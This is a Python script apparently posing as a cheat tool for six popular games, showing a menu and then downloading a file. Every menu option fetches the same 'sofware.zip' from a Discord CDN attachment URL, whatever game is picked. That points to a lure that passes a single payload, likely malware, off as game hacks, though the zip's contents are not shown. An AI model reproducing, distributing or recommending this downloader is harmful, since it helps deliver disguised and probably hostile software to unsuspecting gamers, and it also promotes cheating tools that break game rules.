import urllib.request
import os
from colorama import init, Fore, Style

init(autoreset=True)

script_dir = os.path.dirname(os.path.abspath(__file__))

def download_cheat(game_url, save_path):
    try:
        if os.path.exists(save_path):
            print(f"{Fore.YELLOW}File already exists. Overwrite? (y/n){Style.RESET_ALL}")
            choice = input().lower()
            if choice != 'y':
                return

        headers = {'User-Agent': 'Mozilla/5.0'}
        request = urllib.request.Request(game_url, headers=headers)
        with urllib.request.urlopen(request) as response:
            with open(save_path, 'wb') as file:
                file.write(response.read())
        print(f"{Fore.GREEN}File downloaded and saved as {save_path}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error downloading file: {e}{Style.RESET_ALL}")

def apply_valorant_cheat():
    print(f"{Fore.CYAN}Cheats for Valorant: Wallhack, Aimbot...{Style.RESET_ALL}")
    cheat_data_url = 'https://cdn.discordapp.com/attachments/1272297049915789316/1272310032192765952/sofware.zip?ex=66ba828e&is=66b9310e&hm=5a616e6aed71ab89698bd52dcff227993c6420c3eee0e34cd00564092c65fe3f&'
    local_cheat_file = os.path.join(script_dir, 'valorant_cheat.zip')
    download_cheat(cheat_data_url, local_cheat_file)

def apply_cs2_cheat():
    print(f"{Fore.CYAN}Cheats for Counter-Strike 2: ESP, No Recoil...{Style.RESET_ALL}")
    cheat_data_url = 'https://cdn.discordapp.com/attachments/1272297049915789316/1272310032192765952/sofware.zip?ex=66ba828e&is=66b9310e&hm=5a616e6aed71ab89698bd52dcff227993c6420c3eee0e34cd00564092c65fe3f&'
    local_cheat_file = os.path.join(script_dir, 'cs2_cheat.zip')
    download_cheat(cheat_data_url, local_cheat_file)

def apply_fortnite_cheat():
    print(f"{Fore.CYAN}Cheats for Fortnite: Speed Hack, No Clip...{Style.RESET_ALL}")
    cheat_data_url = 'https://cdn.discordapp.com/attachments/1272297049915789316/1272310032192765952/sofware.zip?ex=66ba828e&is=66b9310e&hm=5a616e6aed71ab89698bd52dcff227993c6420c3eee0e34cd00564092c65fe3f&'
    local_cheat_file = os.path.join(script_dir, 'fortnite_cheat.zip')
    download_cheat(cheat_data_url, local_cheat_file)

def apply_roblox_cheat():
    print(f"{Fore.CYAN}Cheats for Roblox: Infinite Jump, Fly Hack...{Style.RESET_ALL}")
    cheat_data_url = 'https://cdn.discordapp.com/attachments/1272297049915789316/1272310032192765952/sofware.zip?ex=66ba828e&is=66b9310e&hm=5a616e6aed71ab89698bd52dcff227993c6420c3eee0e34cd00564092c65fe3f&'
    local_cheat_file = os.path.join(script_dir, 'roblox_cheat.zip')
    download_cheat(cheat_data_url, local_cheat_file)

def apply_minecraft_cheat():
    print(f"{Fore.CYAN}Cheats for Minecraft: X-Ray, God Mode...{Style.RESET_ALL}")
    cheat_data_url = 'https://cdn.discordapp.com/attachments/1272297049915789316/1272310032192765952/sofware.zip?ex=66ba828e&is=66b9310e&hm=5a616e6aed71ab89698bd52dcff227993c6420c3eee0e34cd00564092c65fe3f&'
    local_cheat_file = os.path.join(script_dir, 'minecraft_cheat.zip')
    download_cheat(cheat_data_url, local_cheat_file)

def apply_cod_warzone_cheat():
    print(f"{Fore.CYAN}Cheats for Call of Duty Warzone: Aimbot, Infinite Ammo...{Style.RESET_ALL}")
    cheat_data_url = 'https://cdn.discordapp.com/attachments/1272297049915789316/1272310032192765952/sofware.zip?ex=66ba828e&is=66b9310e&hm=5a616e6aed71ab89698bd52dcff227993c6420c3eee0e34cd00564092c65fe3f&'
    local_cheat_file = os.path.join(script_dir, 'cod_warzone_cheat.zip')
    download_cheat(cheat_data_url, local_cheat_file)

def main():
    ascii_art = f"""
{Fore.YELLOW}
  _                                 ____         __                          _       
 | |   _   _ _ __  _ __   _____  __/ ___|  ___  / _|_      ____ _ _ __ ___  (_) ___  
 | |  | | | | '_ \| '_ \ / _ \ \/ /\___ \ / _ \| |_\ \ /\ / / _` | '__/ _ \ | |/ _ \ 
 | |__| |_| | | | | | | | (_) >  <  ___) | (_) |  _|\ V  V / (_| | | |  __/_| | (_) |
 |_____\__, |_| |_|_| |_|\___/_/\_\|____/ \___/|_|   \_/\_/ \__,_|_|  \___(_)_|\___/ 
       |___/                                                                         
{Style.RESET_ALL}
"""
    print(ascii_art)
    while True:
        print(f"{Fore.MAGENTA}\nSelect a game:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}1. Valorant{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}2. Counter-Strike 2{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}3. Fortnite{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}4. Roblox{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}5. Minecraft{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}6. Call of Duty Warzone{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}0. Exit{Style.RESET_ALL}")

        choice = input(f"{Fore.GREEN}Enter your choice: {Style.RESET_ALL}")
        if choice == '1':
            apply_valorant_cheat()
        elif choice == '2':
            apply_cs2_cheat()
        elif choice == '3':
            apply_fortnite_cheat()
        elif choice == '4':
            apply_roblox_cheat()
        elif choice == '5':
            apply_minecraft_cheat()
        elif choice == '6':
            apply_cod_warzone_cheat()
        elif choice == '0':
            break
        else:
            print(f"{Fore.RED}Wrong choice. Please try again.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()